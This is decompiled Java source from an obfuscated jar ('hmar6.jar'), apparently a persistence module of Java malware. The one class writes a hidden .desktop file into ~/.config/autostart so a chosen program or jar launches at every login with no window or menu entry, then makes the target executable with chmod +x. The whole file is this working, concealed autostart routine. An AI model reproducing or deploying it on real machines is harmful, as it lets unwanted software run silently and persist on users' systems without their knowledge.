package b;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

/* loaded from: hmar6.jar:b/d.class */
public final class d extends a {
    public d(String str, String str2, boolean z) {
        super(str, str2, z);
    }

    private static File b() {
        return new File(String.valueOf(System.getProperty("user.home")) + "/.config/autostart/");
    }

    @Override // b.a
    public final void a() {
        if (!b().exists()) {
            b().mkdirs();
        }
        PrintWriter printWriter = new PrintWriter(new FileWriter(new File(b(), String.valueOf(this.f27b) + ".desktop")));
        printWriter.println("[Desktop Entry]");
        printWriter.println("Type=Application");
        printWriter.println("Name=" + this.f27b);
        if (this.f26a) {
            printWriter.println("Exec=java -jar '" + this.c + "'");
        } else {
            printWriter.println("Exec=" + this.c);
        }
        printWriter.println("Terminal=false");
        printWriter.println("NoDisplay=true");
        printWriter.close();
        Runtime.getRuntime().exec(new String[]{"chmod", "+x", this.c});
    }
}
